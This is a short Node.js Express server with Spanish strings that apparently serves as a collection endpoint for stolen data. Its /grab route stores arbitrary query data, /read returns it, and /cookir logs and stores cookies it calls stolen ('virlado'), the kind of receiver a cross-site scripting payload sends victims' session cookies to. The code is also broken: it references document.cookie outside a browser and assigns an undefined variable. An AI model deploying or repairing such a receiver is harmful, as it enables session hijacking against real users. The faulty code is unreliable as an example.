const express = require('express');
const app = express();
let texto = "";
let cokkiesQueGuardo = "";
let cookies = document.cookie;


app.get('/', (req, res) => {
  res.send('Holiwi')
})

app.get('/grab', (req, res) => {
    const data = req.query.data
    texto += " " + data
    res.send(data)
  })
  app.get('/read', (req, res) => {
    res.send(texto)
  })
  
  app.get('/cookir', (req, res) => {
      let cookie = req.query.cookie
      cokkiesQueGuardo = cookiee
      console.log("Cookies que he virlado:" + cookie)
      res.send('Hola wuenas tardes, estas cookies estan almacenadas:' + cokkiesQueGuardo)
  
  })

app.listen(3001, () => {
  console.log(`Hola mundo`)
})




